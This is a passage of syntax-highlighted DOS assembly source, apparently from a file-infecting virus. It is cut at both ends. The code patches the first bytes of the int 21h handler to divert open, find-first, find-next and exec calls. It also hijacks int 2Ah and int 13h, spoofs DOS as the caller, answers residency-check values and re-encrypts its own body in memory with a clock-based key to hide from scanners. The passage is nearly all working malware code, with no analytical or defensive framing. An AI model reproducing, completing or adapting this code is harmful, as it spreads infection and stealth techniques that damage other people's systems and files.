                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">21CDh</span><span class="sc0">         </span><span class="sc1">; Encode int 21h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_i6</span><span class="sc0">                 </span><span class="sc1">; Stupid JMP!!</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
</span><span class="sc5">exit_i6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">    

</span><span class="sc5">caller_IP</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">caller_CS</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">int_ac</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">; Remove return address from stack</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i21_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; Get real int 21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i21_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_2bytes_21h</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Restore original bytes</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">function_table</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">l_cmp_function</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Function in table?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_function</span><span class="sc0">  </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_cmp_function</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4A00h</span><span class="sc0">        </span><span class="sc1">; 4B00h? Exec?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_function</span><span class="sc0">  </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">         </span><span class="sc1">; 0FFh?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_abcd</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">warning_msg</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">cmp_abcd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0AACDh</span><span class="sc0">       </span><span class="sc1">; 0ABCDh?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_4b53</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">warning_msg</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">cmp_4b53</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4A53h</span><span class="sc0">        </span><span class="sc1">; 4B53h?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_cccc</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">warning_msg</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">cmp_cccc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0CBCCh</span><span class="sc0">       </span><span class="sc1">; 0CCCCh?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_dead</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">warning_msg</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">cmp_dead</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DDADh</span><span class="sc0">       </span><span class="sc1">; 0DEADh?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exec_21h</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">warning_msg</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">exec_21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jmp_21h</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">function_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3Dh</span><span class="sc0">     </span><span class="sc1">; Open</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4Eh</span><span class="sc0">     </span><span class="sc1">; Find-first</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4Fh</span><span class="sc0">     </span><span class="sc1">; Find-next</span><span class="sc0">

</span><span class="sc5">found_function</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decrypt_memory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_original_i13h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0ABh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_memory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_i13h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jmp_21h</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">exit_21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_i13h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_memory</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i21_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i21_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ACCDh</span><span class="sc0">  </span><span class="sc1">; int ACh in starting bytes of int 21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">jmp_21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">flags</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">           </span><span class="sc1">; Save flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get &amp; save int 2Ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i2A_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i2A_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_2A_2</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">   </span><span class="sc1">; Set new int 2Ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">saved_AX</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">return_from_int</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc1">; Return address</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">saved_DI</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">saved_ES</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">flags</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">                  </span><span class="sc1">; DOS Segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">l_search_retf</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; Search for a RETF in DOS seg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0CBh</span><span class="sc0">   </span><span class="sc1">; RETF?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_retf</span><span class="sc0">              </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_search_retf</span><span class="sc0">

</span><span class="sc5">found_retf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; The int will return to a RETF in the</span><span class="sc0">
                                        </span><span class="sc1">;  DOS segment -&gt; It simulates that the</span><span class="sc0">
                                        </span><span class="sc1">;  call to the int was done by DOS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">saved_ES</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">     </span><span class="sc1">; Restore registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">saved_DI</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">saved_AX</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                    </span><span class="sc1">; jmp far (exec int 21h)</span><span class="sc0">
</span><span class="sc5">ofs_i21_2</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_i21_2</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">return_from_int</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_i2A_2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_2A_2</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">restore_i2A_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i2A_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; Restore int 2Ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i2A_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">int_2A_2</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Int 2Ah: Called at the end of an int 21h</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i21_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i21_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ACCDh</span><span class="sc0">  </span><span class="sc1">; int 0ACh in starting bytes of int 21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_i2A_2</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">_2bytes_21h</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ofs_i2A_2</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_i2A_2</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">saved_AX</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">saved_DI</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">saved_ES</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">flags</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">encrypt_memory</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">6Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get random number (clock)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">mem_mask</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">int_24</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc0">
</span><span class="sc5">l_encrypt_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">      </span><span class="sc1">; Encrypt code in memory</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_encrypt_memory</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">decrypt_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">int_24</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc0">
</span><span class="sc5">l_decrypt_memcode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
